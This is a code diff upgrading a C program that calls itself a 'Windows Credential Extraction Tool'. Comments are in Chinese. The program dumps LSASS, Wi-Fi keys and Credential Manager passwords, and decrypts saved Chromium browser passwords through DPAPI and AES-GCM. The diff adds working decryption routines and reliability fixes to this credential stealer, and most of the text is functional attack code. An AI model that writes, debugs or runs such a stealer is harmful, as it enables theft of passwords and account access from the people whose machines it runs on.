@@ -1,6 +1,6 @@
-// laztool_v7.c
+// laztool_debug.c
 // 编译: x64 Native Tools Command Prompt
-// cl /O2 /MT /Fe:LazTool.exe laztool_v7.c sqlite3.c /link wlanapi.lib dbghelp.lib credui.lib crypt32.lib bcrypt.lib shell32.lib
+// cl /O2 /MT /Fe:LazTool.exe laztool_debug.c sqlite3.c /link wlanapi.lib dbghelp.lib credui.lib crypt32.lib bcrypt.lib shell32.lib advapi32.lib
 
 #define _WIN32_WINNT 0x0601
 #include <windows.h>
@@ -13,6 +13,7 @@
 #include <shlwapi.h>
 #include <dpapi.h>
 #include <bcrypt.h>
+#include <sddl.h>      // 用于 SID 转字符串
 #include "sqlite3.h"
 
 #pragma comment(lib, "wlanapi.lib")
@@ -22,13 +23,14 @@
 #pragma comment(lib, "crypt32.lib")
 #pragma comment(lib, "bcrypt.lib")
 #pragma comment(lib, "shell32.lib")
-#pragma comment(lib, "advapi32.lib")  // 補上這一行（負責進程 Token 與登錄檔 API）
-#pragma comment(lib, "user32.lib")    // 建議順便補上這一行防禦
-
+#pragma comment(lib, "advapi32.lib")
 
 #ifndef WLAN_PROFILE_GET_PLAINTEXT
 #define WLAN_PROFILE_GET_PLAINTEXT 0x00000002
 #endif
+
+// ------------------- 全局 DPAPI 状态 -------------------
+BOOL g_UserDPAPIWorks = FALSE;
 
 // ------------------- 辅助函数 -------------------
 BOOL IsElevated() {
@@ -86,6 +88,31 @@ DWORD GetProcessPid(const wchar_t* procName) {
         CloseHandle(snapshot);
     }
     return pid;
+}
+
+// 获取当前用户的 SID 字符串 (用于诊断)
+void GetCurrentUserSID(wchar_t* sidStr, DWORD sidStrLen) {
+    HANDLE hToken = NULL;
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
+        wcscpy_s(sidStr, sidStrLen, L"Failed");
+        return;
+    }
+    DWORD tokenInfoSize = 0;
+    GetTokenInformation(hToken, TokenUser, NULL, 0, &tokenInfoSize);
+    PTOKEN_USER pTokenUser = (PTOKEN_USER)malloc(tokenInfoSize);
+    if (pTokenUser && GetTokenInformation(hToken, TokenUser, pTokenUser, tokenInfoSize, &tokenInfoSize)) {
+        LPWSTR sidString = NULL;
+        if (ConvertSidToStringSidW(pTokenUser->User.Sid, &sidString)) {
+            wcscpy_s(sidStr, sidStrLen, sidString);
+            LocalFree(sidString);
+        } else {
+            wcscpy_s(sidStr, sidStrLen, L"ConvertFailed");
+        }
+    } else {
+        wcscpy_s(sidStr, sidStrLen, L"NoInfo");
+    }
+    free(pTokenUser);
+    CloseHandle(hToken);
 }
 
 // ------------------- 模块1: LSASS 转储 -------------------
@@ -184,7 +211,11 @@ void DumpCredentialManager() {
     PCREDENTIALW* creds = NULL;
     DWORD count = 0;
     if (!CredEnumerateW(NULL, 0, &count, &creds)) {
-        printf("[-] CredEnumerate failed: %lu\n", GetLastError());
+        DWORD err = GetLastError();
+        printf("[-] CredEnumerate failed: %lu\n", err);
+        if (err == ERROR_NO_SUCH_LOGON_SESSION) {
+            printf("    -> No saved credentials.\n");
+        }
         return;
     }
     int found = 0;
@@ -192,12 +223,15 @@ void DumpCredentialManager() {
         printf("\n[*] Target: %S\n", creds[i]->TargetName ? creds[i]->TargetName : L"(null)");
         printf("    Username: %S\n", creds[i]->UserName ? creds[i]->UserName : L"(null)");
         if (creds[i]->CredentialBlobSize && creds[i]->CredentialBlob) {
-            // Try as wide string
             if (creds[i]->CredentialBlobSize % 2 == 0) {
                 wchar_t* pwd = (wchar_t*)creds[i]->CredentialBlob;
                 int len = creds[i]->CredentialBlobSize / 2;
-                if (pwd[len-1] == 0) len--;
-                printf("    Password: %.*S\n", len, pwd);
+                if (len > 0 && pwd[len-1] == 0) len--;
+                if (len > 0) {
+                    printf("    Password: %.*S\n", len, pwd);
+                } else {
+                    printf("    Password: (empty)\n");
+                }
             } else {
                 printf("    Password (ANSI): %.*s\n", creds[i]->CredentialBlobSize, (char*)creds[i]->CredentialBlob);
             }
@@ -210,54 +244,114 @@ void DumpCredentialManager() {
     if (found == 0) printf("[-] No credentials with passwords found.\n");
 }
 
-// ------------------- 模块4: DPAPI Demo -------------------
+// ------------------- 模块4: DPAPI 详细诊断 -------------------
 void DemonstrateDPAPI() {
-    printf("\n[+] ===== DPAPI Test =====\n");
+    printf("\n[+] ===== DPAPI Diagnosis =====\n");
     
-    wchar_t test[] = L"DPAPI_Test_Data_For_CurrentUser";
-    DWORD dataSize = (DWORD)((wcslen(test) + 1) * sizeof(wchar_t));
-
-    // 💡 修正關鍵：使用 LocalAlloc 在堆疊 (Heap) 上申請一塊標準對齊的記憶體
+    // 显示当前用户信息
+    wchar_t userName[256];
+    DWORD userSize = 256;
+    GetUserNameW(userName, &userSize);
+    wchar_t sidStr[256];
+    GetCurrentUserSID(sidStr, 256);
+    printf("[*] Current User: %S, SID: %S\n", userName, sidStr);
+    
+    // 尝试访问用户主密钥（通过调用 CredEnum，其内部会触发 DPAPI 初始化）
+    printf("[*] Testing user DPAPI by encrypting a small buffer...\n");
+    wchar_t testData[] = L"DPAPI_Test_String_For_CurrentUser";
+    DWORD dataSize = (DWORD)((wcslen(testData) + 1) * sizeof(wchar_t));
     BYTE* secureBuffer = (BYTE*)LocalAlloc(LPTR, dataSize);
     if (!secureBuffer) {
         printf("[-] LocalAlloc failed\n");
         return;
     }
-    // 將資料複製過去，此時 secureBuffer 的指標位址 100% 安全合規
-    RtlCopyMemory(secureBuffer, test, dataSize);
-
+    memcpy(secureBuffer, testData, dataSize);
     DATA_BLOB in = { secureBuffer, dataSize };
     DATA_BLOB enc = {0}, dec = {0};
-
-    // 傳入標準對齊的 heap 指標
-    if (!CryptProtectData(&in, L"Test", NULL, NULL, NULL, 0, &enc)) {
-        printf("[-] CryptProtectData failed: %lu\n", GetLastError());
-        LocalFree(secureBuffer);
-        return;
-    }
-
-    if (!CryptUnprotectData(&enc, NULL, NULL, NULL, NULL, 0, &dec)) {
-        printf("[-] CryptUnprotectData failed: %lu\n", GetLastError());
-        LocalFree(secureBuffer);
+    
+    // 用户级 DPAPI (使用当前用户主密钥)
+    if (CryptProtectData(&in, L"TestUser", NULL, NULL, NULL, 0, &enc)) {
+        printf("[*] CryptProtectData (user) succeeded.\n");
+        if (CryptUnprotectData(&enc, NULL, NULL, NULL, NULL, 0, &dec)) {
+            printf("[+] User-level DPAPI works. Decrypted: %S\n", (wchar_t*)dec.pbData);
+            g_UserDPAPIWorks = TRUE;
+            LocalFree(dec.pbData);
+        } else {
+            printf("[-] User-level CryptUnprotectData failed: %lu\n", GetLastError());
+        }
         LocalFree(enc.pbData);
-        return;
+    } else {
+        DWORD err = GetLastError();
+        printf("[-] User-level CryptProtectData failed: %lu\n", err);
+        if (err == 998) {
+            printf("    Explanation: No DPAPI master key for current user.\n");
+            printf("    Try: 1) Logout and login again.\n");
+            printf("         2) Run 'rundll32.exe keymgr.dll, KRShowKeyMgr' to initialize.\n");
+            printf("         3) Add a dummy credential via Control Panel.\n");
+        }
     }
-
-    printf("[+] DPAPI works. Decrypted: %S\n", (wchar_t*)dec.pbData);
-
-    // 釋放所有配置的記憶體
+    
+    // 机器级 DPAPI (不依赖用户)
+    char testMachine[] = "Machine level test";
+    DATA_BLOB inMachine = { (BYTE*)testMachine, (DWORD)strlen(testMachine)+1 };
+    DATA_BLOB encMachine = {0}, decMachine = {0};
+    if (CryptProtectData(&inMachine, L"TestMachine", NULL, NULL, NULL, CRYPTPROTECT_LOCAL_MACHINE, &encMachine)) {
+        printf("[*] Machine-level DPAPI works.\n");
+        if (CryptUnprotectData(&encMachine, NULL, NULL, NULL, NULL, CRYPTPROTECT_LOCAL_MACHINE, &decMachine)) {
+            printf("[+] Machine-level decrypt: %s\n", (char*)decMachine.pbData);
+            LocalFree(decMachine.pbData);
+        }
+        LocalFree(encMachine.pbData);
+    } else {
+        printf("[-] Machine-level CryptProtectData failed: %lu\n", GetLastError());
+    }
+    
     LocalFree(secureBuffer);
-    LocalFree(enc.pbData);
-    LocalFree(dec.pbData);
 }
 
-
 // ------------------- 模块5: Chromium 密码 -------------------
-// 函数声明已在前面，这里给出实现
-BYTE* DecryptDPAPIBlob(BYTE* pEncryptedData, DWORD dwDataSize, DWORD* pdwOutSize);
-BOOL AesGcmDecrypt(const BYTE* key, DWORD keyLen, const BYTE* iv, DWORD ivLen, const BYTE* ciphertext, DWORD ciphertextLen, BYTE* plaintext, DWORD* plaintextLen);
+BYTE* DecryptDPAPIBlob(BYTE* pEncryptedData, DWORD dwDataSize, DWORD* pdwOutSize) {
+    if (!g_UserDPAPIWorks) return NULL;
+    DATA_BLOB DataIn, DataOut;
+    DataIn.pbData = pEncryptedData;
+    DataIn.cbData = dwDataSize;
+    if (!CryptUnprotectData(&DataIn, NULL, NULL, NULL, NULL, 0, &DataOut)) {
+        return NULL;
+    }
+    *pdwOutSize = DataOut.cbData;
+    return DataOut.pbData;
+}
+
+BOOL AesGcmDecrypt(const BYTE* key, DWORD keyLen, const BYTE* iv, DWORD ivLen,
+    const BYTE* ciphertext, DWORD ciphertextLen, BYTE* plaintext, DWORD* plaintextLen) {
+    BCRYPT_ALG_HANDLE hAlg = NULL;
+    BCRYPT_KEY_HANDLE hKey = NULL;
+    BOOL bResult = FALSE;
+    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0))) goto cleanup;
+    if (!BCRYPT_SUCCESS(BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0))) goto cleanup;
+    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (BYTE*)key, keyLen, 0))) goto cleanup;
+
+    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
+    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
+    authInfo.pbNonce = (BYTE*)iv;
+    authInfo.cbNonce = ivLen;
+    authInfo.pbTag = (BYTE*)ciphertext + ciphertextLen - 16;
+    authInfo.cbTag = 16;
+
+    if (BCRYPT_SUCCESS(BCryptDecrypt(hKey, (BYTE*)ciphertext, ciphertextLen - 16, &authInfo, NULL, 0, plaintext, ciphertextLen - 16, plaintextLen, 0))) {
+        bResult = TRUE;
+    }
+cleanup:
+    if (hKey) BCryptDestroyKey(hKey);
+    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
+    return bResult;
+}
 
 void ExtractChromePasswords(const wchar_t* userDataPath, const wchar_t* browserName) {
+    if (!g_UserDPAPIWorks) {
+        printf("[!] User DPAPI unavailable, skipping %S password extraction.\n", browserName);
+        return;
+    }
     wchar_t localStatePath[MAX_PATH];
     wcscpy_s(localStatePath, MAX_PATH, userDataPath);
     wcscat_s(localStatePath, MAX_PATH, L"\\Local State");
@@ -300,7 +394,7 @@ void ExtractChromePasswords(const wchar_t* userDataPath, const wchar_t* browserN
     sqlite3* db;
     if (sqlite3_open16(loginDataPath, &db) != SQLITE_OK) {
         printf("[!] Cannot open %S Login Data (browser may be open)\n", browserName);
-        free(masterKey);
+        LocalFree(masterKey);
         free(jsonData);
         return;
     }
@@ -318,7 +412,7 @@ void ExtractChromePasswords(const wchar_t* userDataPath, const wchar_t* browserN
             const BYTE* iv = encryptedPwd + 3;
             const BYTE* ciphertext = encryptedPwd + 15;
             DWORD ciphertextLen = encryptedPwdLen - 15;
-            BYTE* plaintext = (BYTE*)malloc(ciphertextLen);
+            BYTE* plaintext = (BYTE*)malloc(ciphertextLen + 1);
             DWORD plaintextLen = 0;
             if (AesGcmDecrypt(masterKey, masterKeyLen, iv, 12, ciphertext, ciphertextLen, plaintext, &plaintextLen)) {
                 plaintext[plaintextLen] = '\0';
@@ -335,7 +429,7 @@ void ExtractChromePasswords(const wchar_t* userDataPath, const wchar_t* browserN
         printf("[!] Failed to query %S Login Data\n", browserName);
     }
     sqlite3_close(db);
-    free(masterKey);
+    LocalFree(masterKey);
     free(jsonData);
 }
 
@@ -382,7 +476,7 @@ void DumpRDPCredentials() {
 int main() {
     SetConsoleOutputCP(CP_UTF8);
     printf("=========================================================\n");
-    printf("      Windows Credential Extraction Tool v7.0          \n");
+    printf("      Windows Credential Extraction Tool v8.0          \n");
     printf("                (Run as Administrator)                  \n");
     printf("=========================================================\n");
     if (!IsElevated()) {
@@ -393,10 +487,10 @@ int main() {
     }
     printf("[+] Admin privileges confirmed.\n");
 
-    DumpLsass();               // 可注释掉以节省时间
+    DumpLsass();
     DumpWifiPasswords();
     DumpCredentialManager();
-    DemonstrateDPAPI();
+    DemonstrateDPAPI();  // 这里会设置 g_UserDPAPIWorks
 
     wchar_t appDataLocal[MAX_PATH];
     if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataLocal))) {
@@ -418,65 +512,4 @@ int main() {
     printf("\n[*] All modules completed. Press Enter to exit.\n");
     getchar();
     return 0;
-}
-
-// =================================================================
-// 函式實作：請直接貼在 cha.c 檔案的最底部
-// =================================================================
-
-BYTE* DecryptDPAPIBlob(BYTE* pEncryptedData, DWORD dwDataSize, DWORD* pdwOutSize) {
-    if (!pEncryptedData || dwDataSize == 0 || !pdwOutSize) return NULL;
-    DATA_BLOB dataIn, dataOut;
-    dataIn.pbData = pEncryptedData;
-    dataIn.cbData = dwDataSize;
-
-    if (CryptUnprotectData(&dataIn, NULL, NULL, NULL, NULL, 0, &dataOut)) {
-        *pdwOutSize = dataOut.cbData;
-        return dataOut.pbData; 
-    }
-    *pdwOutSize = 0;
-    return NULL;
-}
-
-BOOL AesGcmDecrypt(const BYTE* key, DWORD keyLen, const BYTE* iv, DWORD ivLen, const BYTE* ciphertext, DWORD ciphertextLen, BYTE* plaintext, DWORD* plaintextLen) {
-    BCRYPT_ALG_HANDLE hAlg = NULL;
-    BCRYPT_KEY_HANDLE hKey = NULL;
-    DWORD cbData = 0;
-    NTSTATUS status = 0;
-
-    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
-    if (status != 0) return FALSE;
-
-    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
-    if (status != 0) { BCryptCloseAlgorithmProvider(hAlg, 0); return FALSE; }
-
-    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (BYTE*)key, keyLen, 0);
-    if (status != 0) { BCryptCloseAlgorithmProvider(hAlg, 0); return FALSE; }
-
-    if (ciphertextLen < 16) {
-        BCryptDestroyKey(hKey);
-        BCryptCloseAlgorithmProvider(hAlg, 0);
-        return FALSE;
-    }
-    
-    DWORD actualCipherLen = ciphertextLen - 16;
-    BYTE* authTag = (BYTE*)(ciphertext + actualCipherLen);
-
-    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO paddingInfo;
-    BCRYPT_INIT_AUTH_MODE_INFO(paddingInfo);
-    paddingInfo.pbNonce = (BYTE*)iv;
-    paddingInfo.cbNonce = ivLen;
-    paddingInfo.pbTag = authTag;
-    paddingInfo.cbTag = 16;
-
-    status = BCryptDecrypt(hKey, (BYTE*)ciphertext, actualCipherLen, &paddingInfo, NULL, 0, plaintext, actualCipherLen, &cbData, 0);
-    
-    BCryptDestroyKey(hKey);
-    BCryptCloseAlgorithmProvider(hAlg, 0);
-
-    if (status == 0) {
-        *plaintextLen = cbData;
-        return TRUE;
-    }
-    return FALSE;
 }
